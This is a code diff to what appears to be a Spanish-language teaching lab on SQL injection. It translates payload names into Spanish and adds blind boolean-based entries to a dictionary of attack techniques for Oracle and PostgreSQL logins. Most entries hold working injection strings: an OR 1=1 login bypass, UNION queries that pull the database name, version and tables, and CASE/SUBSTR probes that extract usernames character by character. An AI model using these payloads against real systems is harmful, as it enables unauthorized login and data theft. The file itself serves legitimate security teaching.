@@ -12,25 +12,25 @@ sql_injections = {
         "credenciales":[
             {
                 # Login sin credenciales válidas
-                "nombre":"Unauthorized login",
+                "nombre":"Login sin credenciales válidas",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' OR 1=1 --"
             },
             {
                 # Obtener informacion sobre la existencia de tablas en la BD
-                "nombre":"DB tables info",
+                "nombre":"Informacion sobre las tablas",
                 "usuario":"' OR 1=(SELECT * FROM tabla_inexistente) --",
                 "password":"cualquier_input"
             },
             {
                 # Obtener informacion sobre columnas en una tabla existente
-                "nombre":"DB table column info",
+                "nombre":"Informacion sobre las columnas de una tabla",
                 "usuario":"' OR 1=(SELECT columna_inexistente FROM Usuarios) --",
                 "password":"cualquier_input"
             },
             {
                 # Obtener informacion sobre el SGBD al probar si la funcion version() es valida en el SGBD en el que se esta trabajando (funciona en PostgreSQL y MySQL)
-                "nombre":"SGBD info",
+                "nombre":"Informacion sobre el SGBD",
                 "usuario":"' OR version() = 'PostgreSQL' --",
                 "password":"cualquier_input"
             }
@@ -62,42 +62,42 @@ sql_injections = {
         """,
         "credenciales":[
             {
-                "nombre":"Unauthorized login",
+                "nombre":"Login sin credenciales válidas",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' OR 1=1 --"
             },
             {
-                "nombre":"DB name (Oracle)",
+                "nombre":"Nombre de la BD (Oracle)",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' UNION SELECT 1, ora_database_name, NULL AS nombre_bd FROM dual --"
             },
             {
-                "nombre":"DB version (Oracle)",
+                "nombre":"Versión de la BD (Oracle)",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' UNION SELECT NULL, banner, NULL FROM v$version WHERE banner LIKE 'Oracle%' --"
             },
             {
-                "nombre":"DB name (PostgreSQL)",
+                "nombre":"Nombre de la BD (PostgreSQL)",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' UNION SELECT current_database() AS nombre_bd; --"
             },
             {
-                "nombre":"DB version (PostgreSQL)",
+                "nombre":"Versión de la BD (PostgreSQL)",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' UNION SELECT NULL, version(), NULL; --"
             },
             {
-                "nombre":"All tables in the DB (Oracle)",
+                "nombre":"Todas las tablas en la BD (Oracle)",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE OWNER='SYSTEM' -- AND password = 'cualquier_input'"
             },
             {
-                "nombre":"All tables in the DB (PostgreSQL)",
+                "nombre":"Todas las tablas en la BD (PostgreSQL)",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'; --"
             },
             {
-                "nombre":"All tables in the DB (Oracle - Filtrado)",
+                "nombre":"Todas las tablas en la BD (Oracle Filtrado)",
                 "usuario":"cualquier_input",
                 "password":"cualquier_input' UNION SELECT 1, OWNER, TABLE_NAME FROM all_tables WHERE owner = 'SYSTEM' AND TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE 'SYS%' AND TABLE_NAME NOT LIKE 'LOGMNR%' --"
             }
@@ -123,11 +123,38 @@ sql_injections = {
     },
     "blind_boolean": {
         "title": "Blind Boolean-Based SQL Injection",
+        "is_blind": True,
         "description": """
             <p>Evalúa los resultados en función de respuestas booleanas sin revelar datos directamente. Es útil cuando los mensajes de error
             están deshabilitados, ya que permite al atacante inferir información a través de condiciones booleanas.</p>
         """,
-        "credenciales":[],
+        "credenciales":[ # usuario/password en este caso serían payload que devuelva True y False respectivamente
+            {
+                "nombre":"Entendiendo la inyección",
+                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='1",
+                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='2"
+            },
+            {
+                "nombre":"Sacando la longitud de un campo (Oracle)",
+                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
+                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --"
+            },
+            {
+                "nombre":"Sacando la longitud de un campo (PostgreSQL)",
+                "usuario":"",
+                "password":""
+            },
+            {
+                "nombre":"Sacando un carácter de un campo (Oracle)",
+                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
+                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'z') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --"
+            },
+            {
+                "nombre":"Sacando un carácter de un campo (PostgreSQL)",
+                "usuario":"",
+                "password":""
+            }
+        ],
         "usuario": "admin",
         "clave": "admin",
         "route_oracle": "login_oracle_blind_boolean",
@@ -137,6 +164,7 @@ sql_injections = {
     },
     "time_based": {
         "title": "Time-Based Blind SQL Injection",
+        "is_blind": True,
         "description": """
             <p>Evalúa el tiempo de respuesta del servidor para inferir si la inyección es exitosa o no. Es útil en aplicaciones
             que no revelan errores ni permiten consultas booleanas.</p>
